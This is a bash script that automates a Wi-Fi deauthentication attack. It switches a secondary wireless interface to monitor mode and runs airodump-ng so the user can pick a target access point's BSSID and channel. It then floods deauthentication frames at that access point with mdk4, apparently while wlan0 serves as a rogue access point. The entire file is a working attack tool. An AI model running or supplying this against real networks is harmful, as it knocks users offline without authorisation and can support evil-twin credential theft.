#!/bin/bash

if [[ $(id -u) -ne 0 ]] ; then echo "Run it as root" ; exit 1 ; fi

interfaces=($(iw dev | awk '$1=="Interface"{ print $2 }'))
printf "[*] Interfaces: \n\n"

iwconfig

startInterfaces=${#interfaces[@]}

if [ ${#interfaces[@]} == 0 ]; then
    echo "[!] No wireless interfaces detected, exiting..."
    exit 1
fi

wifaceAP="wlan0"

if [ ${#interfaces[@]} -gt 1 ]; then

    interfaces=( ${interfaces[@]/$wifaceAP} )
    interfaces+=( "exit" )

    printf "[?] Specify a wireless interface from below to perform deauth attack or exit:\n"
    for i in "${!interfaces[@]}"; do
        printf '\n[%s] %s' "$i" "${interfaces[i]}"
    done
    printf "\n>"
    read wifaceindex
    while ! [[ "$wifaceindex" =~ ^[0-9]+$ ]] || [ "$wifaceindex" -lt 0 ] || [ "$wifaceindex" -ge ${#interfaces[@]} ]
    do
        printf "\n[!] Input wasn't within the range, re-enter a wireless interface from below to perform deauth attack or exit:\n"
        for i in "${!interfaces[@]}"; do
            printf '\n[%s] %s' "$i" "${interfaces[i]}"
        done
        printf "\n>"
        read wifaceindex
    done

    wiface=${interfaces[$wifaceindex]}

    if [ "$wiface" != "exit" ]; then
        ifconfig $wiface down
        #airmon-ng check kill
        iwconfig $wiface mode monitor
        ifconfig $wiface up
        read -p "[*] Press Enter to start airodump-ng, then CTRL-C when you find target AP..."
        airodump-ng $wiface
        printf "\n"
        echo "[?] Specify BSSID of the target AP from airodump-ng output:"
        printf "> "
        read bssid
        printf "\n"
        echo "[?] Specify CHANNEL of the target AP from airodump-ng output:"
        printf "> "
        read channel 
        printf "$bssid\n" > blacklist.txt
    fi

else
    echo "[!] Can't start deauth attack, secondary wireless interface is not connected..."
    exit 1
fi

if [ $startInterfaces -gt 1 ] && [ "$wiface" != "exit" ]; then
    mdk4 $wiface d -b blacklist.txt -c $channel
fi
